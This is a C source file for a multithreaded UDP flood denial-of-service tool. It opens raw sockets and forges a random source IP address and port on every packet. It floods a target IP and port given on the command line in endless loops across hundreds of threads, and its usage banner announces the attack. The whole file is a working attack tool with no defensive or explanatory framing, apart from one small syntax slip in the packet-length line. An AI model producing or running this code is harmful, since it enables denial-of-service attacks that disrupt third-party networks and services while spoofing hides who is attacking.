#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MAX_PACKET_SIZE 1500
#define DEFAULT_THREADS 500

struct attack_params {
    char *target_ip;
    int target_port;
    int packet_size;
    int thread_id;
};

// Function to create raw socket
int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket() error");
        exit(EXIT_FAILURE);
    }
    return sock;
}

// Function to create UDP packet
void create_udp_packet(char *packet, int packet_size, const char *src_ip, const char *dst_ip, int src_port, int dst_port) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    
    // Fill IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr));
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);
    
    // Fill UDP header
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr)));
    udp->check = 0;
    
    // Fill payload with random data
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    for (int i = 0; i < (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr)); i++) {
        payload[i] = rand() % 256;
    }
}

// Thread function for UDP flood
void *udp_flood_thread(void *arg) {
    struct attack_params *params = (struct attack_params *)arg;
    
    int sock = create_raw_socket();
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in dest_addr;
    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(params->target_ip);
    dest_addr.sin_port = htons(params->target_port);
    
    // Random source IP and port
    char src_ip[16];
    int src_port;
    
    while (1) {
        // Generate random source IP and port
        snprintf(src_ip, 16, "%d.%d.%d.%d", 
                rand() % 256, rand() % 256, 
                rand() % 256, rand() % 256);
        src_port = rand() % 65535;
        
        // Create new packet with random source
        create_udp_packet(packet, params->packet_size, src_ip, params->target_ip, src_port, params->target_port);
        
        // Send packet
        if (sendto(sock, packet, params->packet_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto() error");
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target_ip> <target_port> <threads> <packet_size>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    
    if (packet_size > MAX_PACKET_SIZE) {
        printf("Packet size too large (max %d)\n", MAX_PACKET_SIZE);
        return EXIT_FAILURE;
    }
    
    printf("Starting UDP flood attack on %s:%d with %d threads (packet size: %d)\n", 
           target_ip, target_port, threads, packet_size);
    
    pthread_t thread_ids[threads];
    struct attack_params params[threads];
    
    // Create threads
    for (int i = 0; i < threads; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        
        if (pthread_create(&thread_ids[i], NULL, udp_flood_thread, &params[i]) != 0) {
            perror("pthread_create() error");
            return EXIT_FAILURE;
        }
    }
    
    // Wait for threads (they run indefinitely)
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    return EXIT_SUCCESS;
}